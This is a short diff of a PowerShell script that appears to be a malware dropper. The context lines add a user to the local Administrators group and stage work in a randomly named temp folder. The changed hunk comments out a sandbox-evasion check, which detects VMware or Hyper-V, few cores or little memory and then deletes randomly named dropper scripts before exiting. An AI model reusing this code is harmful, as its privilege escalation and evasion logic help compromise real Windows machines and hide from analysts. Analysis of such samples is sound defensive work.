@@ -14,15 +14,15 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Add-LocalGroupMember -Member $username -Group "Administrators"
 }
 
-if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
-    (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
-    (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
-    Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1" -Force
-    Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd" -Force
-    Remove-Item -Path "$initial_dir\initial.cmd" -Force
-    Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Force
-    exit
-}
+# if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
+#     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
+#     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
+#     Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1" -Force
+#     Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd" -Force
+#     Remove-Item -Path "$initial_dir\initial.cmd" -Force
+#     Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Force
+#     exit
+# }
 
 Set-Variable -Name wd -Value (random_text)
 Set-Variable -Value ("$env:temp\$wd") -Name path
